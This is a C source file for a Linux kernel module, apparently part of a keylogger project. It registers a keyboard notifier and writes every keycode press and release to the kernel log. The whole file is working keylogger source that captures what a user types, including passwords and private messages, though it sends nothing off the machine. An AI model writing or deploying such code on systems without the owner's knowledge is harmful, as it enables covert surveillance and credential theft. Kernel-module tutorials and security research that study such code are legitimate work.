#include "keylogger.h"
#include "logging.h"

#include <linux/notifier.h>
#include <linux/keyboard.h>

static int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param);

static struct notifier_block s_nblk = {
    .notifier_call = keylogger_notify
};

/**
 * Register for callbacks from the keyboard driver
 */
int keylogger_register(void) {
    return register_keyboard_notifier(&s_nblk);
}

/**
 * Unregister from callback from the keyboard driver
 */
void keylogger_unregister(void) {
    unregister_keyboard_notifier(&s_nblk);
}

/**
 * Handle a notificatio from the keyboard driver about a keypress event.
 * Returns NOTIFY_OK on success or if the event was ignored.
 */
int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param) {
    struct keyboard_notifier_param* kbdParam = param;

    // We are only interested in keycode notifications, ignore everything else.
    if (code != KBD_KEYCODE) {
        return NOTIFY_OK;
    }

    // If param is NULL then return error
    if (!param) {
        return NOTIFY_BAD;
    }

    // Log the event
    LOG_INFO(
        "Keylogger event: %d %s\n",
        kbdParam->value,
        (kbdParam->down ? "down" : "up")
        );

    return NOTIFY_OK;
}
